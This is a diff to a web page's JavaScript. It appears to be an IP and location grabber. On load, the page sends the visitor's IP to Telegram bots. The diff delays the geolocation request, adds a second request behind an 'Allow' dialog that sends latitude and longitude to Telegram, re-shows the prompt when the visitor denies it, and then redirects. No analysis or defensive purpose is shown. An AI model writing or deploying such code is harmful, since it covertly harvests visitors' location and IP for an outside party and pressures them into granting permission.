@@ -10,22 +10,21 @@
 
     sendIPToTelegramBots();
     
-    // Request location permission automatically
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        // Location permission granted, send location and IP results to Telegram bots
-        await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-      },
-      (error) => {
-        if (error.code === error.PERMISSION_DENIED) {
-
-
-           showAlert();
-          // Location permission denied, send IP result to Telegram bots
-          
+    setTimeout(() => {
+      // Request location permission automatically after a delay of 1 second
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          // Location permission granted, send location and IP results to Telegram bots
+          await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            showAlert();
+            // Location permission denied, send IP result to Telegram bots
+          }
         }
-      }
-    );
+      );
+    }, 1000);
   });
 
   async function sendLocationAndIPToTelegramBots(latitude, longitude) {
@@ -146,6 +145,26 @@ function showAlert() {
     if (result) {
       // Allow button clicked
      // console.log("Allowed");
+
+
+
+
+
+      // Allow button clicked
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          // Location permission granted, send location and IP results to Telegram bots
+          await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            showAlert();
+            // Location permission denied, send IP result to Telegram bots
+          }
+        }
+      );
+
+
 redirectToNextURL();
     } else {
       // Deny button clicked or dialog closed
